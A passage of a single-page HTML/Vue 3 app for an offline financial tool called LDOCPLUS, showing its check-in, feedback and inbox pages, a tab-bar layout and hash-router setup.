                        <button class="btn" @click="doCheckin" :disabled="checked">{{ checked ? 'Checked In Today' : 'Click to Check-in' }}</button>
                    </div>
                </div>
            `,
            setup() {
                const checked = ref(localStorage.getItem('checked_today') === 'true');
                function doCheckin() {
                    checked.value = true;
                    localStorage.setItem('checked_today', 'true');
                    showToast('Check-in successful!');
                }
                return { checked, doCheckin };
            }
        };
        const FeedbackPage = {
            template: `
                <div>
                    <div class="header-bar">
                        <button class="back-btn" @click="$router.back()">Back</button>
                        <div class="header-title">Feedback</div>
                        <div style="width:40px;"></div>
                    </div>
                    <div class="card" style="margin:16px;">
                        <label>Title</label>
                        <input type="text" v-model="title" placeholder="Enter title">
                        <label>Content</label>
                        <textarea v-model="content" rows="4" placeholder="Describe your issue or suggestion"></textarea>
                        <button class="btn" :disabled="!isValid" @click="submit" style="margin-top: 12px;">Submit Feedback</button>
                    </div>
                </div>
            `,
            setup() {
                const router = useRouter();
                const title = ref('');
                const content = ref('');
                const isValid = computed(() => title.value.trim() && content.value.trim());

                function submit() {
                    if(!isValid.value) return;
                    showToast('Feedback sent successfully');
                    title.value = '';
                    content.value = '';
                    router.back();
                }

                return { title, content, isValid, submit };
            }
        };
        const InboxPage = {
            template: `
                <div>
                    <div class="header-bar">
                        <button class="back-btn" @click="$router.back()">Back</button>
                        <div class="header-title">Inbox</div>
                        <div style="width:40px;"></div>
                    </div>
                    <div style="padding: 16px;">
                        <div class="card" @click="openMsg" style="cursor:pointer; margin:0;">
                            <div style="font-weight: 600;">Welcome to LDOCPLUS</div>
                            <div style="font-size: 12px; color: var(--text-secondary); margin-top: 4px;">Tap to read full system message.</div>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                function openMsg() {
                    showToast('Welcome! Enjoy our offline financial suite.');
                }
                return { openMsg };
            }
        };

        // Main Layout with Tab Bar
        const MainLayout = {
            template: `
                <div class="app-container">
                    <router-view v-slot="{ Component }">
                        <transition name="fade" mode="out-in">
                            <component :is="Component" />
                        </transition>
                    </router-view>
                    
                    <!-- Tab Bar -->
                    <div class="tab-bar" v-if="showTabBar">
                        <router-link to="/home" class="tab-item">
                            <svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path></svg>
                            <span>Home</span>
                        </router-link>
                        <router-link to="/toolbox" class="tab-item">
                            <svg viewBox="0 0 24 24"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"></rect><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path></svg>
                            <span>Toolbox</span>
                        </router-link>
                        <router-link to="/settings" class="tab-item">
                            <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>
                            <span>Settings</span>
                        </router-link>
                    </div>
                </div>
            `,
            setup() {
                const route = useRoute();
                const showTabBar = computed(() => ['/home', '/toolbox', '/settings'].includes(route.path));
                return { showTabBar };
            }
        };

        // Router Configuration
        const routes = [
            { path: '/', component: LoadingPage },
            { 
                path: '/', 
                component: MainLayout, 
                children: [
                    { path: 'home', component: HomePage },
                    { path: 'toolbox', component: ToolboxPage },
                    { path: 'settings', component: SettingsPage },
                    { path: 'detail', component: DetailPage },
                    { path: 'sublist', component: SubListPage },
                    { path: 'version', component: VersionPage },
                    { path: 'privacy', component: PrivacyPage },
                    { path: 'terms', component: TermsPage },
                    { path: 'team', component: TeamPage },
                    { path: 'checkin', component: CheckinPage },
                    { path: 'feedback', component: FeedbackPage },
                    { path: 'inbox', component: InboxPage }
                ]
            }
        ];

        const router = createRouter({
            history: createWebHashHistory(),
            routes
        });

        const App = {
            template: `
                <router-view></router-view>
                <div v-if="toastMsg" class="toast">{{ toastMsg }}</div>
            `,
            setup() {
                return { toastMsg };
            }
        };

        createApp(App).use(router).mount('#app');
    </script>
</body>
</html>
